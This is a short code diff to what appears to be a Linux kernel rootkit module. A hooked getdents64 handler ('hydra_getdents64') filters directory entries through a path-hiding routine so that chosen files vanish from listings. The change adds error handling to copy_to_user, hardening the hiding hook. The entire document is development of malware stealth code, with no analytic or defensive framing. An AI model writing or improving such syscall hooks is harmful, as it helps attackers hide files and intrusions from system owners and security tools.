@@ -162,8 +162,10 @@ static long hydra_getdents64(const struct pt_regs *regs)
 		goto orig;
 	}
 	filtered = pathhide_filter_dirents(snapshot, len, fdpath);
-	if (filtered >= 0 && filtered < len)
-		copy_to_user(user_data, snapshot, filtered);
+	if (filtered >= 0 && filtered < len) {
+		if (copy_to_user(user_data, snapshot, filtered))
+			goto orig;
+	}
 	vfree(snapshot);
 	return len;
 orig:
